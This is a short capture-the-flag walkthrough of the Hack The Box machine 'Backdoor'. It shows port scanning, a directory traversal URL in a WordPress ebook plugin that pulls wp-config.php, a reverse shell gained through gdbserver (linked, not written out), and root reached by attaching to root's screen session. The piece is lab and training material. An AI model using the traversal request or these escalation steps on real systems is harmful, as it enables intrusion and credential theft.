---
title: "HTB - Backdoor"
date: 2025-07-26
author: "ChaosSec"
tags: ["HTB", "WordPress", "GDB", "Linux", "Privilege Escalation"]
summary: ""
---

## 🔍 Port Scanning

```bash
sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.11.125 -oG allPorts
```

```bash
TCP 22 -
TCP 80 -
TCP 1337 -
199/udp   open|filtered smux
389/udp   open|filtered ldap
518/udp   open|filtered ntalk
687/udp   open|filtered asipregistry
1524/udp  open|filtered ingreslock
1812/udp  open|filtered radius
3456/udp  open|filtered IISrpc-or-vat
```

## 🌐 Web Enumeration

Port 80 hosts a WordPress site.

Run WPScan to enumerate plugins and users:

```bash
wpscan --url http://10.10.11.125/ --api-token <token> --enumerate p,u --plugins-detection aggressive
```

- Found 7 vulnerabilities, though not exploitable directly.
- Found user: `admin`
- The plugin **Akismet** had an XSS vulnerability.

Browsing to:

```
http://10.10.11.125/wp-content/uploads/
```

...and navigating up to `/wp-content/plugins/`, I discovered a plugin related to ebooks.  
It’s vulnerable to **directory traversal**:

```bash
http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```

This allowed me to download `wp-config.php` and extract database credentials.

## 🐚 Local Enumeration

Using the DB credentials, I retrieved additional files:

- `/proc/sched_debug`: helped identify running processes
- `/proc/net/tcp`: revealed listening ports

Inside `sched_debug`, I discovered `gdbserver` running.

## ⚙️ Remote Code Execution via GDB

Referencing this guide:  
🔗 https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver

I achieved a **reverse shell** via `gdbserver`, and upgraded it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## ⬆️ Privilege Escalation

Running LinPEAS, I discovered an open `screen` session by the **root** user.

Checked for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Confirmed `screen` is vulnerable.

To attach to the root user's screen session:

```bash
export TERM='vt100'
screen -x root/root
```

🏁 **Root access obtained.**
